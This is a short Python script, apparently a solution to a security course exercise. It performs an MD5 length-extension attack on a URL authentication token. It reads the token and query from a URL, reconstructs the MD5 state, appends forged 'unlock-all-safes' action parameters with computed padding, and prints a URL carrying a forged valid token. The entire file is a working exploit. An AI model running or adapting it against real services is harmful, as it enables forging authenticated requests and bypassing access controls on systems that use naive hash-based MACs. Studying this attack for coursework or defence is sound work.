from pymd5 import md5, padding
from codecs import decode
from urllib.parse import urlparse, quote
import sys

# Get URL as input
inputURL = sys.argv[1]
splitURL = urlparse(inputURL)

# Get URL info
currentToken = splitURL.query[6:38] # Token from the url
currentMessage = splitURL.query[39:] # Everything after token in the url

# Generate new token
messageLength = (len(currentMessage) + 8)
bits = (messageLength + len(padding(messageLength*8)))*8
newToken = md5(state=decode(currentToken, "hex"), count=bits)

# Create new message and add to token
appendedMessage = ""
check = True
count = 1
while check: # Loop for each customer input
   if "action%s"%count in currentMessage:
      appendedMessage += "&action%s=unlock-all-safes"%count
      count += 1	
   else:
      check = False
newToken.update(appendedMessage)

# Create padding and new message
newPadding = quote(padding(messageLength*8))
newMessage = currentMessage + newPadding + appendedMessage

# Create new URL and print
newURL = inputURL[:37] + newToken.hexdigest() + "&" + newMessage
print(newURL)
